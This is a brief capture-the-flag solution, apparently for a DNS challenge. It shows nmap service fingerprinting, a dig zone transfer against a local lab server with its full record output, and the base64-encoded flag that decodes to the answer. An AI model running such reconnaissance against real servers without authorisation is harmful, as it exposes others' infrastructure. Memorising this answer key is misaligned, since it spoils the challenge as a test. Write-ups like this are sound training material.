# solution
- service fingerprinting
    -`nmap -sV <IP> -p 2211`
    - bind -> DNS
- zone transfer using dig
    - iterate new TLDs
    - `dig -p 2211 axfr @<IP> deans-transfers.express`
- base64-decode
    - `aGUyMDIye2QzNG5fZHIxdjNzX3lvdV8zdjNyeXdoM3IzISF9` -> flag

```
>> dig -p 2211 axfr @127.0.0.1 deans-transfers.express

; <<>> DiG 9.10.6 <<>> -p 2211 axfr @127.0.0.1 deans-transfers.express
; (1 server found)
;; global options: +cmd
deans-transfers.express. 302400	IN	SOA	deans-transfers.express. admin.deans-transfers.express.deans-transfers.express. 2 302400 43200 302400 302400
deans-transfers.express. 302400	IN	NS	ns.deans-transfers.express.
aGUyMDIye2QzNG5fZHIxdjNzX3lvdV8zdjNyeXdoM3IzISF9.deans-transfers.express. 302400 IN A 10.0.0.8
base64decode.deans-transfers.express. 302400 IN	A 10.0.13.9
ns.deans-transfers.express. 302400 IN	A	10.0.0.2
deans-transfers.express. 302400	IN	SOA	deans-transfers.express. admin.deans-transfers.express.deans-transfers.express. 2 302400 43200 302400 302400
;; Query time: 4 msec
;; SERVER: 127.0.0.1#2211(127.0.0.1)
;; WHEN: Sat Jan 15 10:30:06 CET 2022
;; XFR size: 6 records (messages 1, bytes 281)
```